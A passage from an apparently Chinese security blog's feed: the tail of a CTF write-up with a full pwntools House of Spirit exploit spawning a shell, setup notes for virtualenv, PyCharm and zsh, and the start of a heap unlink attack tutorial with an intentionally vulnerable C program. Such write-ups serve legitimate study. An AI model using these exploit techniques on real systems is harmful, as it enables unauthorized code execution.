class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="comment"># author: 0x4C43</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./spirited_away'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./spirited_away'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment1</span><span class="params">(name,age,reason,comment)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.send(reason)</div><div class="line">    p.recvuntil(<span class="string">'comment: '</span>)</div><div class="line">    p.send(comment)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment2</span><span class="params">(age,reason)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.sendline(reason)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">24</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">24</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    <span class="keyword">print</span> hex(addr)</div><div class="line">    libc_base = addr -libc.symbols[<span class="string">'_IO_file_sync'</span>]<span class="number">-7</span></div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> libc_base</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakstack</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">80</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">80</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakechunk</span><span class="params">(stack)</span>:</span></div><div class="line">    fake_chunk = <span class="string">"DDDD"</span>        <span class="comment"># prev_size</span></div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># size</span></div><div class="line">    fake_chunk += (<span class="number">0x40</span><span class="number">-8</span>)*<span class="string">"D"</span></div><div class="line">    fake_chunk += p32(<span class="number">0</span>)  </div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># next chunk size</span></div><div class="line"></div><div class="line">    fake_chunk_ptr = stack - <span class="number">0x70</span> + <span class="number">8</span></div><div class="line">    comment  = <span class="string">"D"</span> * <span class="number">0x50</span></div><div class="line">    comment += p32(<span class="number">0x00</span>)       <span class="comment"># fake age</span></div><div class="line">    comment += p32(fake_chunk_ptr) <span class="comment"># overwrite name ptr</span></div><div class="line"></div><div class="line">    comment1(<span class="string">"DDDD"</span>,<span class="string">"40"</span>,fake_chunk, comment)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    raw_input(<span class="string">'add 100 comment to overwrite nbytes'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        comment1(<span class="string">"AAAA"</span>,<span class="string">"10"</span>,<span class="string">"AAAA"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.sendline(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</div><div class="line">        comment2(<span class="string">"10"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.send(<span class="string">'y'</span>)   </div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak system_addr'</span>)</div><div class="line">    libc_base = leaklibc()</div><div class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'sh\0'</span>))</div><div class="line">    log.success(<span class="string">"system_addr: &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">    log.success(<span class="string">"binsh_addr: &#123;&#125;"</span>.format(hex(binsh_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak stack address'</span>)</div><div class="line">    stack_addr = leakstack()</div><div class="line">    log.success(<span class="string">"stack_addr: &#123;&#125;"</span>.format(hex(stack_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'overflow return addr to exec system("/bin/sh")'</span>)   </div><div class="line">    <span class="comment"># add fake chunk to fastbin</span></div><div class="line">    fakechunk(stack_addr)</div><div class="line">    <span class="comment"># alloc fake chunk to name, and overwrite return addr of survey</span></div><div class="line">    name = <span class="number">76</span>*<span class="string">"E"</span> + p32(system_addr) + <span class="string">"EEEE"</span> + p32(binsh_addr)</div><div class="line">    comment1(name,<span class="string">"50"</span>,<span class="string">"EEEE"</span>,<span class="string">"EEEE"</span>)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'n'</span>)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h4 id="3）利用过程"><a href="#3）利用过程" class="headerlink" title="3）利用过程"></a>3）<strong>利用过程</strong></h4><p>a）首先添加 100 条评论，使得 v1 溢出修改 nbytes 为 0x6e。nbytes 被修改前内存中地址如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/46175149.jpg" alt=""><br>nbytes 被修改后内存中地址如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/70375310.jpg" alt="">    </p>
<p>b）接着利用内存泄露漏洞可得到 libc 中 _IO_file_sync 函数在内存中的地址，题目已给 libc.so 文件，通过该地址可计算处 system 函数和 “/bin/sh” 字符串的地址。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/50239044.jpg" alt=""><br>此外，利用该漏洞还能泄露栈地址，通过计算偏移量可得到堆指针 *name 的内存地址，为后续覆盖该堆指针做准备。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/91788711.jpg" alt="">       </p>
<p>c）继续添加评论时，可在 reason 内存中伪造一个 fast chunk。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/93324098.jpg" alt="">  </p>
<p>d）溢出 comment 变量内存，修改堆指针 *name 指向伪造的 chunk。堆指针被覆盖前内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/47717698.jpg" alt=""><br>堆指针被覆盖后内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/37025857.jpg" alt="">     </p>
<p>e）之后添加评论前程序会 free(name)，此时伪造的 chunk 将被加入 fastbin 中。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/18602401.jpg" alt="">   </p>
<p>f）再次添加评论，会把栈中伪造的 chunk 分配给 name，此时溢出 name 可覆盖 survey 函数的返回地址为 system 函数地址。返回地址被修改前内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/27242292.jpg" alt=""><br>返回地址被修改后内存如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/44036325.jpg" alt="">   </p>
<p>g）程序返回时将执行 system。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/83693658.jpg" alt="">   </p>
<hr>
<p>References:<br>[1] <a href="http://phrack.org/issues/66/10.html" target="_blank" rel="external">MALLOC DES-MALEFICARUM</a><br>[2] <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html" target="_blank" rel="external">House of Spirit</a><br>[3] <a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="external">堆之House of Spirit</a>  </p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> house-of-spirit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[配置 Linux Python 开发环境]]></title>
      <url>/%E9%85%8D%E7%BD%AE%20Linux%20Python%20%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      <content type="html"><![CDATA[<p>环境：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">64</span>bit Ubuntu <span class="number">16.04</span><span class="number">.4</span> LTS (Xenial Xerus)</div><div class="line">Python <span class="number">2.7</span><span class="number">.12</span></div></pre></td></tr></table></figure></p>
<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a><strong>0x01 安装</strong></h3><h4 id="1）virtualenvwrapper"><a href="#1）virtualenvwrapper" class="headerlink" title="1）virtualenvwrapper"></a><strong>1）virtualenvwrapper</strong></h4><p>virtualenv 是一个可以在同一台计算机中隔离多个 Python 环境的工具。它能够用于创建独立的 Python 环境，使得多个 Python 环境互不影响。virtualenvwrapper 是 virtualenv 的扩展管理包，可以更方便地管理虚拟环境。</p>
<p>使用 pip 命令安装 virtualenvwrapper，默认安装在 /usr/local/bin 目录下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenvwrapper</div></pre></td></tr></table></figure></p>
<p>配置环境变量 WORKON_HOME 指定虚拟环境管理目录，然后运行 virtualenvwrapper.sh 初始化配置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export WORKON_HOME=$HOME/Virtualenv</div><div class="line">source /usr/local/bin/virtualenvwrapper.sh</div></pre></td></tr></table></figure></p>
<p>为了避免每次使用前手动执行以上命令，可以将其写入 shell 配置文件 ~/.bashrc 或 ~/.zshrc 中。</p>
<p><strong>错误：</strong><br>pip 安装依赖包出现以下错误：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> -=: <span class="string">'Retry'</span> <span class="keyword">and</span> <span class="string">'int'</span>TypeError: unsupported operand type(s) <span class="keyword">for</span> -=: <span class="string">'Retry'</span> <span class="keyword">and</span> <span class="string">'int'</span></div></pre></td></tr></table></figure></p>
<p>出现该错误是因为使用的网络挂了代理，使用 pip 之前需要配置环境变量 http_proxy 到代理服务器的地址。可通过以下<a href="https://stackoverflow.com/a/39484683" target="_blank" rel="external">两种方法解决</a>。<br>a）设置环境变量：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export http_proxy=<span class="string">"http://user:pass@my.site:port/"</span></div></pre></td></tr></table></figure></p>
<p>b）使用 —proxy 选项：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--proxy=[user:<span class="keyword">pass</span>@]url:port</div></pre></td></tr></table></figure></p>
<h4 id="2）Pycharm"><a href="#2）Pycharm" class="headerlink" title="2）Pycharm"></a><strong>2）Pycharm</strong></h4><p>在<a href="https://www.jetbrains.com/pycharm/?fromMenu" target="_blank" rel="external">官网</a>下载软件包，然后解压到 /opt 目录下并安装。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo tar xf pycharm-community<span class="number">-2017.3</span><span class="number">.4</span>.tar.gz -C /opt/</div><div class="line">cd /opt/PyCharm-community<span class="number">-2017.3</span><span class="number">.4</span>/bin</div><div class="line">./pycharm.sh</div></pre></td></tr></table></figure></p>
<p>安装过程中可选择安装 IdeaVim 插件。</p>
<h3 id="0x02-使用与配置"><a href="#0x02-使用与配置" class="headerlink" title="0x02 使用与配置"></a><strong>0x02 使用与配置</strong></h3><h4 id="1）创建虚拟环境"><a href="#1）创建虚拟环境" class="headerlink" title="1）创建虚拟环境"></a><strong>1）创建虚拟环境</strong></h4><p>virtualenv 常用命令如下：   </p>
<blockquote>
<p>mkvirtualenv: Create a new virtualenv in $WORKON_HOME<br>cdvirtualenv: change to the $VIRTUAL_ENV directory<br>lsvirtualenv: list virtualenvs<br>rmvirtualenv: Remove a virtualenv<br>workon: list or change working virtualenvs    </p>
</blockquote>
<p>在项目开发过程中需要安装不同的依赖库，为了使不同项目中使用的依赖库不会互相影响，可以为每个项目单独创建一个虚拟 python 运行环境。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkvirtualenv TestVirtualenv</div></pre></td></tr></table></figure></p>
<p>可加上参数–no-site-packages，可以不复制已经安装到系统 Python 环境的所有第三方包，得到一个干净的 Python 运行环境。创建好后，进入该虚拟环境安装所需的依赖库。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdvirtualenv TestVirtualenv</div><div class="line">pip install somepackages</div></pre></td></tr></table></figure></p>
<h4 id="2）Pycharm-1"><a href="#2）Pycharm-1" class="headerlink" title="2）Pycharm"></a><strong>2）Pycharm</strong></h4><p>Pycharm 已集成 virtualenv 功能，可以在新建项目时创建 virtualenv，也可以使用已有的 virtualenv。<br><strong>a）创建新的 virtualenv</strong><br>创建项目时新建一个 virtualenv。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">File -&gt; New Project -&gt; Project Interpreter -&gt; New environment using Virtualenv</div><div class="line"></div><div class="line">Location：指定 virtualenv 保存目录；</div><div class="line">Base interpreter：选择接收器；</div><div class="line">Inherit global site-packages：继承 Base interpreter 中安装的第三方库；</div><div class="line">Make available to all projects：将此虚拟环境提供给其他项目使用。</div></pre></td></tr></table></figure></p>
<p><strong>b）使用已有 virtualenv</strong><br>创建项目时选择已有的 virtualenv 。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">File -&gt; New Project -&gt; Project Interpreter -&gt; Existing Interpreter</div><div class="line">-&gt; Setting -&gt; Add Local Python Interpreter</div><div class="line">选择已有 virtualenv 所在目录中的解释器。</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.jetbrains.com/help/pycharm/quick-start-guide.html" target="_blank" rel="external">Pycharm Quick Start Guide</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[zsh 使用笔记]]></title>
      <url>/zsh%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Zsh 是一款功能强大终端（shell）软件，既可以作为交互式终端，也可以作为脚本解释器。它在兼容 Bash 的同时，还有提供了很多改进，例如：</p>
<blockquote>
<p>更高效<br>更好的自动补全<br>更好的文件名展开（通配符展开）<br>可定制性高    </p>
</blockquote>
<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a><strong>0x01 安装</strong></h3><h4 id="1）安装-zsh"><a href="#1）安装-zsh" class="headerlink" title="1）安装 zsh"></a><strong>1）安装 zsh</strong></h4><p>首先安装 zsh，并设置 zsh 为系统默认 bash。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install Zsh</div><div class="line">chsh -s $(which zsh)</div></pre></td></tr></table></figure></p>
<p>注销（Log out）并重新进入系统，此时 shell 默认为 zsh。</p>
<h4 id="2）安装-oh-my-zsh"><a href="#2）安装-oh-my-zsh" class="headerlink" title="2）安装 oh-my-zsh"></a><strong>2）安装 oh-my-zsh</strong></h4><p>由于 zsh 配置过于复杂，所以安装 oh-my-zsh 可简化 zsh 的配置。oh-my-zsh 有 200 多各插件和 140 多种主题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo sh -c <span class="string">"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</span></div></pre></td></tr></table></figure></p>
<h3 id="0x02-配置"><a href="#0x02-配置" class="headerlink" title="0x02 配置"></a><strong>0x02 配置</strong></h3><h4 id="1）配置主题"><a href="#1）配置主题" class="headerlink" title="1）配置主题"></a><strong>1）配置主题</strong></h4><p>修改 ~/.zshrc 中的 ZSH_THEME 参数可配置不同样式的主题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZSH_THEME=<span class="string">"agnoster"</span></div></pre></td></tr></table></figure></p>
<p>修改后发现主题中存在乱码，这是缺少 Powerline 字体导致的，所以需安装 Powerline 字体。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/powerline/fonts  </div><div class="line">cd fonts</div><div class="line">./install.sh</div></pre></td></tr></table></figure></p>
<p>安装完后设置终端字体，ubuntu 中通过以下方式设置。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Edit -&gt; Profile Preferences -&gt; General -&gt; Text Appearance -&gt; Custom font</div><div class="line">-&gt; Ubuntu Mono derivative Powerline Regular</div></pre></td></tr></table></figure></p>
<h4 id="2）隐藏用户名"><a href="#2）隐藏用户名" class="headerlink" title="2）隐藏用户名"></a><strong>2）隐藏用户名</strong></h4><p>默认情况下，命令提示符前有固定的 “username@hostname” ，可在 .zshrc 中添加以下环境变量隐藏该信息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export DEFAULT_USER= <span class="string">"username "</span>   <span class="comment"># username 需替换为系统默认用户名</span></div></pre></td></tr></table></figure></p>
<h3 id="0x03-插件"><a href="#0x03-插件" class="headerlink" title="0x03 插件"></a><strong>0x03 插件</strong></h3><h4 id="1）帮助文档高亮"><a href="#1）帮助文档高亮" class="headerlink" title="1）帮助文档高亮"></a><strong>1）帮助文档高亮</strong></h4><p>colored-man-pages 插件可使 man 帮助文档高亮显示，该插件在 oh-my-zsh 中自带，只需在 .zshrc 中启用即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">plugins=(</div><div class="line">  colored-man-pages</div><div class="line">  ...</div><div class="line">)</div></pre></td></tr></table></figure></p>
<h4 id="2）历史记录补全"><a href="#2）历史记录补全" class="headerlink" title="2）历史记录补全"></a><strong>2）历史记录补全</strong></h4><p>zsh-autosuggestions 插件可根据历史记录自动补全命令，输入命令时会以暗色补全，按方向键右键完成输入。首先下载至 zsh 的 plugins 目录下，然后在 .zshrc 中启用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</div></pre></td></tr></table></figure></p>
<h4 id="3）命令高亮"><a href="#3）命令高亮" class="headerlink" title="3）命令高亮"></a><strong>3）命令高亮</strong></h4><p>zsh-syntax-highlighting 插件可使输入的命令根据主题自动高亮。输入正确的命令是黄色，输入错误的命令是红色。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</div></pre></td></tr></table></figure></p>
<h4 id="4）历史命令搜索"><a href="#4）历史命令搜索" class="headerlink" title="4）历史命令搜索"></a><strong>4）历史命令搜索</strong></h4><p>history-substring-search 插件可进行历史命令搜索，如果和 zsh-syntax-highlighting 插件共用，要配置到语法高亮插件之后。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/zsh-users/zsh-history-substring-search.git $ZSH_CUSTOM/plugins/history-substring-search</div></pre></td></tr></table></figure></p>
<p>输入部分命令后，使用上下键查询可匹配的历史命令。</p>
<h3 id="0x04-使用"><a href="#0x04-使用" class="headerlink" title="0x04 使用"></a><strong>0x04 使用</strong></h3><h4 id="1）命令补全"><a href="#1）命令补全" class="headerlink" title="1）命令补全"></a><strong>1）命令补全</strong></h4><p>按两下 tab 键可以触发 zsh 的补全，所有待补全项都可以通过键盘方向键或者 <ctrl-n p="" f="" b=""> 来选择。</ctrl-n></p>
<h4 id="2）命令选项补全"><a href="#2）命令选项补全" class="headerlink" title="2）命令选项补全"></a><strong>2）命令选项补全</strong></h4><p>支持命令选项的补全。例如 ls -<tab><tab> 会直接列出所有 ls 的参数。</tab></tab></p>
<h4 id="3）命令参数补全"><a href="#3）命令参数补全" class="headerlink" title="3）命令参数补全"></a><strong>3）命令参数补全</strong></h4><p>支持命令参数的补全。例如 kill 进程名<tab>，zsh 就会自动补全进程的 pid。</tab></p>
<h4 id="4）快速目录切换"><a href="#4）快速目录切换" class="headerlink" title="4）快速目录切换"></a><strong>4）快速目录切换</strong></h4><p>zsh 会记住每一次切换的路径，然后通过 1 来切换到上一次访问的路径，2 切换到上上次，一直到 9，还可以通过 d 查看目录访问历史。</p>
<hr>
<p>References:<br>[1] <a href="https://github.com/robbyrussell/oh-my-zsh/wiki" target="_blank" rel="external">oh-my-zsh</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> zsh </tag>
            
            <tag> oh-my-zsh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 堆内存溢出 unlink 攻击]]></title>
      <url>/Linux%20%E5%A0%86%E6%BA%A2%E5%87%BA%20unlink%20%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>在二进制漏洞利用中，缓冲区溢出漏洞是最常见的一类漏洞，这类漏洞具有很强的危害性，通常能被攻击者利用并实现任意代码执行。缓冲区溢出漏洞可分为基于栈的内存溢出和基于堆的内存溢出。本文主要介绍如何利用堆内存溢出进行 unlink 攻击，进而实现任意代码执行。</p>
<p>首先看以下漏洞程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> *first, *second;</div><div class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</div><div class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</div><div class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</div><div class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</div><div class="line">    <span class="built_in">free</span>(first);</div><div class="line">    <span class="built_in">free</span>(second);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>上述程序在分配完堆后，堆内存分布如下图所示。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-10-31/17968347.jpg" alt=""></p>
<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。     </p>
<p>下面具体介绍 unlink 机制和 unlink 攻击的原理。</p>
<h3 id="0x01-释放堆与-unlink"><a href="#0x01-释放堆与-unlink" class="headerlink" title="0x01 释放堆与 unlink"></a><strong>0x01 释放堆与 unlink</strong></h3><p>释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态，若是则会进行堆合并。合并时会将空闲 chunk 从 bin 中 unlink，并将合并后的 chunk 添加到 unsorted bin 中。堆合并分为向前合并和向后合并。</p>
<h4 id="1）向后合并"><a href="#1）向后合并" class="headerlink" title="1）向后合并"></a><strong>1）向后合并</strong></h4><p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
<p>malloc.c 中向后合并的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></div><div class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></div><div class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></div><div class="line"></div><div class="line">sz = hd &amp; ~PREV_INUSE;</div><div class="line"><span class="comment">/* consolidate backward */</span></div><div class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</div><div class="line">&#123;</div><div class="line">  prevsz = p-&gt;prev_size;</div><div class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</div><div class="line">  sz += prevsz;</div><div class="line">  unlink(p, bck, fwd);</div><div class="line">&#125;</div><div class="line">set_head(p, sz | PREV_INUSE);</div></pre></td></tr></table></figure></p>
<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
<h4 id="2）向前合并"><a href="#2）向前合并" class="headerlink" title="2）向前合并"></a><strong>2）向前合并</strong></h4><p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
<p>malloc.c 中向前合并的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></div><div class="line"> (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</div><div class="line"></div><div class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></div><div 